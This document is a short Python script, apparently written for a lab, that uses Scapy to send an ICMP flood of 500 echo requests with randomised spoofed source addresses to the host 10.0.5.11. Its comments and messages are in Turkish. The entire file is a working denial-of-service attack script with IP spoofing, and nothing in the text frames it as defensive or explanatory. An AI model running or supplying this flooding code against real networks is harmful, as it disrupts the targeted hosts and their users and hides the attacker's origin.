# icmp_flood.py
from scapy.all import *

target_ip = "10.0.5.11"
print(f"ICMP Flood baslatiliyor: {target_ip}")

packets = []
for _ in range(500):
    # type=8 Echo Request demektir
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src=RandIP(), dst=target_ip) / ICMP(type=8)
    packets.append(pkt)

sendp(packets, verbose=0)
print("Ping firtinasi tamamlandi.")